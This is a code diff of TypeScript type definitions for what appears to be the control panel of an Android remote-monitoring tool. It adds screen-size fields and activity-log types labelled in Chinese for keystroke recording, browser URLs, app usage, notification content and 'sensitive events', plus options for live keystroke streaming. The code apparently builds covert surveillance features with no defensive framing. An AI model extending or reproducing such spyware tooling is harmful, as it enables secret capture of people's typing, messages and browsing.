@@ -11,6 +11,8 @@ export interface Device {
   phone_number: string;
   battery_level: number;
   network_type: string;
+  screen_width?: number;
+  screen_height?: number;
   is_online: boolean;
   has_accessibility: boolean;
   installed_at: string;
@@ -90,6 +92,7 @@ export interface DataLoadingState {
   files: boolean;
   apps: boolean;
   keylog: boolean;
+  logs: boolean;
 }
 
 // Touch event types
@@ -115,3 +118,39 @@ export type KeyboardState = 'show' | 'hide';
 
 // Camera selection
 export type CameraSelection = 'front' | 'back';
+
+// Log types — matches APK ActivityMonitor.LogType enum
+export type LogType = 'ACTZ' | 'KSTR' | 'BLNK' | 'VAPS' | 'NTFS' | 'ARTS' | 'SEVT';
+
+export const LOG_TYPE_LABELS: Record<LogType, string> = {
+    ACTZ: '用户操作',
+    KSTR: '键盘记录',
+    BLNK: '浏览器URL',
+    VAPS: 'APP使用',
+    NTFS: '通知内容',
+    ARTS: '系统事件',
+    SEVT: '敏感事件',
+};
+
+export interface LogFileInfo {
+    type: LogType;
+    filename: string;
+}
+
+export interface LogOptions {
+    recKeystrokes: boolean;
+    liveKeystrokes: boolean;
+    recApps: boolean;
+    recLinks: boolean;
+    recNotifications: boolean;
+}
+
+export interface DeviceLogEntry {
+    id: number;
+    device_id: number;
+    log_type: LogType;
+    content: string;
+    device_timestamp: string;
+    device_uid: string;
+    created_at: string;
+}
